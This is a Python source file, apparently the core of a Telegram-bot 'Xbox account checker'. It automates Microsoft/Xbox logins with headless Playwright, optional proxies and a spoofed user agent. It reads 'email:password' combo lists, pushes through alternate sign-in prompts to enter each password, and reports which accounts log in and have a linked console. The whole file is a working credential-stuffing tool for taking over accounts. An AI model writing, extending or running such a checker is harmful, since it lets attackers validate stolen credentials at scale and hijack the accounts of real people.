#!/usr/bin/env python3
"""
XBOX Account Checker - Core functions (modified for Telegram bot)
No user input, headless mode, returns results directly.
"""

import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import List, Dict, Optional, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    """
    Check Xbox console page 3 times (2 sec wait each).
    Returns (has_console, status_message, login_success)
    """
    console_url = "https://www.xbox.com/en-US/play/consoles"
    
    best_priority = 4
    best_has_console = False
    best_message = "Unknown status"
    best_login_success = False
    
    for attempt in range(1, 4):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await asyncio.sleep(2)
            
            page_text = await page.inner_text('body')
            page_text_lower = page_text.lower().replace('\n', ' ').replace('\r', ' ')
            
            if "play your console remotely" in page_text_lower:
                return True, "Play your console remotely (device exists)", True
            
            if "set up your console" in page_text_lower:
                if 2 < best_priority:
                    best_priority = 2
                    best_has_console = False
                    best_message = "Set up your console (logged in, no device)"
                    best_login_success = True
                continue
            
            if "sign in to finish setting up" in page_text_lower:
                if 3 < best_priority:
                    best_priority = 3
                    best_has_console = False
                    best_message = "Sign in to finish setting up (login incomplete)"
                    best_login_success = False
                continue
            
            if 4 < best_priority:
                best_priority = 4
                best_has_console = False
                best_message = "Unknown page content"
                best_login_success = False
                
        except Exception as e:
            if 4 < best_priority:
                best_priority = 4
                best_has_console = False
                best_message = f"Error: {str(e)[:80]}"
                best_login_success = False
    
    return best_has_console, best_message, best_login_success

async def handle_password_entry(page, account_email: str, password: str) -> bool:
    """
    Handle password entry with possible "Sign in another way" and "Use your password" flows.
    Returns True if password submitted successfully, False otherwise.
    """
    try:
        # Try direct password field
        try:
            await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=5000)
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(5)
            return True
        except PlaywrightTimeoutError:
            pass
        
        # Click "Sign in another way" if present
        sign_in_another_way_clicked = False
        try:
            selectors = [
                "a:has-text('Sign in another way')",
                "span:has-text('Sign in another way')",
                "div:has-text('Sign in another way')",
                "button:has-text('Sign in another way')",
                "[data-testid='signInAnotherWay']"
            ]
            for selector in selectors:
                try:
                    element = page.locator(selector).first
                    if await element.count() > 0:
                        await element.click(timeout=2000)
                        sign_in_another_way_clicked = True
                        await page.wait_for_load_state("networkidle")
                        break
                except:
                    continue
        except:
            pass
        
        # Click "Use your password" if present
        try:
            selectors = [
                "a:has-text('Use your password')",
                "span:has-text('Use your password')",
                "div:has-text('Use your password')",
                "button:has-text('Use your password')",
                "[data-testid='usePassword']"
            ]
            for selector in selectors:
                try:
                    element = page.locator(selector).first
                    if await element.count() > 0:
                        await element.click(timeout=2000)
                        await page.wait_for_load_state("networkidle")
                        break
                except:
                    continue
        except:
            pass
        
        # Wait for password field again
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(5)
        return True
        
    except Exception:
        return False

async def process_account(account: Dict, proxy: Optional[str] = None, headless: bool = True) -> Dict:
    """
    Check a single Xbox account.
    Returns dictionary with result.
    """
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser_options = {'headless': headless}
        if proxy:
            browser_options['proxy'] = {'server': proxy}
        
        browser = await p.chromium.launch(**browser_options)
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = await context.new_page()

        # Login flow
        await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")

        # Enter email
        await page.wait_for_selector("input[type='email'], input[name='loginfmt']", timeout=DEFAULT_TIMEOUT)
        await page.fill("input[type='email'], input[name='loginfmt']", account['email'])
        await asyncio.sleep(7)  # 7 seconds delay after email
        
        # Click Next
        try:
            next_button = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next')").first
            await next_button.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        await page.wait_for_load_state("networkidle")

        # Handle password entry
        password_success = await handle_password_entry(page, account['email'], account['password'])
        if not password_success:
            raise Exception("Could not enter password after all attempts")
        
        # Submit password
        try:
            submit_btn = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next'), button:has-text('Sign in')").first
            await submit_btn.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        await page.wait_for_load_state("networkidle")

        # Handle "Stay signed in?" prompt
        try:
            stay_signed_in = page.locator("input[value='Yes'], button:has-text('Yes')").first
            await stay_signed_in.click(timeout=3000)
        except:
            pass

        # Check console
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info

        await browser.close()
        await p.stop()
    except Exception as e:
        result['success'] = False
        result['console_info'] = f"Exception: {str(e)[:80]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    """Parse accounts from text content (lines with email:password)"""
    accounts = []
    lines = content.splitlines()
    for line in lines:
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts